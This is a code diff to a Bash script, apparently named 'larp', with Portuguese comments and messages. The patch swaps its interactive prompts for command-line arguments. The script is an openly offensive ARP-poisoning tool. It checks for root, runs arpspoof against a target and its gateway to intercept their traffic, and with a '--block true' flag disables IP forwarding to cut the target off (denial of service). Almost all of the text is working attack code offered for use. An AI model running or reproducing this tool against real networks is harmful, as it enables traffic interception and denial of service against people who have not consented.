@@ -27,8 +27,16 @@ LINES="$(tput lines)"
 AUTHOR="Lucas Vieira"
 V_MAJOR="1"
 V_MINOR="0"
-V_PATCH="1"
+V_PATCH="2"
 TAMANHO_LINHA=62
+
+# Parâmetros usados na linha de comando
+p1="-a"
+p2="-d"
+p3="--block"
+p4="-i"
+flag1="true"
+flag2="false"
 
 # Subrotinas
 function log_alerta()
@@ -63,14 +71,13 @@ function log_show()
 
 function verifica_ip_forward()
 {
-	flag="$(cat $caminho)"
-	log_pergunta "Deseja fazer um DoS (s/n) ?"
-	read -s -n 1 resposta
-	if [ "$resposta" == "s" ] || [ "$resposta" == "S" ]; then
+	desativar="$1"
+
+	# Configura o repasse dos pacotes
+	if [ "$desativar" == "$flag1" ]; then
+		# Deverá ser feito uma negação de serviço
 		log_info "Desabilitando o repasse de pacotes ..."
-		if [ $flag == "1" ]; then
-			echo 0 > $caminho
-		fi
+		echo 0 > $caminho
 	else
 		log_info "Ativando o repasse de pacotes ..."
 		echo 1 > $caminho
@@ -93,43 +100,38 @@ function checa_host
 	log_ok "Host online: $1"
 }
 
-function get_alvos()
+function get_interfaces()
 {
-	read -p 'Ip do alvo: ' ip_alvo
-	read -p 'Ip de destino do alvo (geralmente é o gateway): ' ip_roteador
-	
-	if [ "$ip_alvo" == "$ip_roteador" ]; then
-		log_err "Alvo e roteador sao os mesmos?"
-		exit 1
-	fi
+	path="/sys/class/net"
 
-	log_info "Verificando alvo ..."
-	checa_host $ip_alvo
-	log_info "Verificando destino ..."
-	checa_host $ip_roteador
-	
-	log_info "Devo interceptar o trafego entre: $ip_alvo e $ip_roteador."
-	log_pergunta "Correto ? (s/n)"
-	read -s -n 1 resposta
-	if [ "$resposta" == "S" ] || [ "$resposta" == "s" ]; then
-		return 0
-	else
-		return 1
-	fi
-}
-
-function get_interface()
-{
-	lista_interfaces="$(ifconfig | grep -E 'wlan[0-9]|eth[0-9]' -o --color=always)"
+	# Listar interfaces de rede
+	interfaces="$(ls $path)"
 	if [ "$?" != "0" ]; then
 		log_err "Um erro ocorreu. Nao foi possivel listar as interfaces disponiveis"
 		exit 1
-	else
-		log_ok "Interfaces wireless encontradas:\n"
-		echo -e "$lista_interfaces\n"
-		log_pergunta "Diga-me qual devo usar: "
-		read interface
-		return 0
+	fi
+
+	log_ok "Interfaces de rede encontradas:\n"
+	for folder in $path/*; do
+		interface_name=$(basename $folder)
+		if [ -d "$folder/wireless" ]; then
+			log_info "$interface_name [Sem fio]"
+		else
+			log_info "$interface_name"
+		fi
+	done
+
+	echo -e "\n"
+}
+
+function interface_existe()
+{
+	path="/sys/class/net"
+
+	result="$(find $path/$1 2>&1)"
+	if [ "$?" != 0 ]; then
+		log_err "A interface de rede '$1' não existe\n"
+		exit 1
 	fi
 }
 
@@ -170,30 +172,67 @@ function mostra_banner()
 	fi
 }
 
+function exibe_uso()
+{
+	echo -e "\n"
+	log_info "Uso: $YELLOW$0$RESET $GREEN$p4$RESET <interface> $GREEN$p1$RESET <ip> $GREEN$p2$RESET <ip> $GREEN$p3$RESET [$GREEN $flag1$RESET |$RED $flag2$RESET]\n"
+	log_info "\t$p4: Interface de rede a ser utilizada"
+	log_info "\t$p1: Endereço de IP do alvo a ser interceptado"
+	log_info "\t$p2: Endereço IP destino dos pacotes enviados pelo alvo"
+	log_info "\t$p3: Bloquear os pacotes de rede (Denial Of Service)\n"
+
+	# Exibe as interfaces de rede disponíveis
+	get_interfaces
+}
+
+function validate_ip
+{
+	ip=$1
+	echo $ip | grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"
+}
+
+function analisa_argumentos()
+{
+	if [ "$1" != "$p4" ] || [ "$3" != "$p1" ] || [ "$5" != "$p2" ] || [ "$7" != "$p3" ]; then
+		log_err "Linha de comando incorreta"
+		return 1
+	fi
+
+	if [ "$8" != "$flag1" ] && [ "$8" != "$flag2" ]; then
+		log_err "Parâmetro inválido: $8"
+		return 1
+	fi
+}
+
 function main()
 {
-	mostra_banner
+	alvo1=$4
+	alvo2=$6
+	flag_dos=$8
+	interface=$2
+
 	log_info "Iniciando o larp ..."
 	if [ "$UID" != "0" ]; then
 		log_err "Eu preciso ser root"
 		exit 1
 	fi
 
-	until get_alvos;
-	do clear
-	done
+	# Verifica se a interface especificada existe
+	interface_existe $interface
 
-	get_interface
-	echo $interface | grep -e wlan -e eth -o > /dev/null
-	if [ "$?" != "0" ]; then
-		log_err "Interface incorreta selecionada"
-	else
-		log_info "Atacando pela interface $interface ..."
-	fi
+	# Certifica-se de que o endereço dos alvos é válido
+	alvo1="$(validate_ip $alvo1)"
+	alvo2="$(validate_ip $alvo2)"
 
-	verifica_ip_forward
-	log_ok "Aplicando o envenenamento ARP ao alvo '$ip_alvo' ..."
-	envenenamento="$(arpspoof -i $interface -t $ip_alvo -r $ip_roteador)"
+	log_info "Checando alvos ..."
+	checa_host $alvo1
+	checa_host $alvo2
+
+	# IP Forwarding
+	verifica_ip_forward $flag_dos
+
+	log_ok "Aplicando o envenenamento ARP ao alvo '$alvo1' ..."
+	envenenamento="$(arpspoof -i $interface -t $alvo1 -r $alvo2)"
 	if [ "$?" != "0" ]; then
 		log_err "O ataque falhou. Verifique se o pacote dsniff foi instalado"
 	else
@@ -202,5 +241,19 @@ function main()
 	resetar_configs_pacotes_ipv4
 }
 
+# Verifica se os argumentos foram fornecidos corretamente
+if [ $# -ne 8 ]; then
+	exibe_uso
+	exit 1
+fi
+
+# Analisa os argumentos fornecidos
+analisa_argumentos $1 $2 $3 $4 $5 $6 $7 $8
+if [ $? -ne 0 ]; then
+	log_err "Argumento(s) inválido(s) passado(s) para o script"
+	exit 1
+fi
+
 # Início
-main
+mostra_banner
+main $1 $2 $3 $4 $5 $6 $7 $8
